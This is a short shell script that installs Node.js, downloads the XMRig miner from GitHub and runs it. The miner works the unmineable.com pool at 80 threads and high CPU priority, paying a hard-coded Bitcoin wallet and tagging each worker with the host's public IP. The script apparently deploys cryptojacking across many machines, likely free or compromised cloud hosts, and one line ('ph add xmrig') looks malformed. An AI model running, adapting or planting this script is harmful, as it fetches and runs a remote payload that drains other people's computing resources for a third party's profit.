wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
ph add xmrig
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive

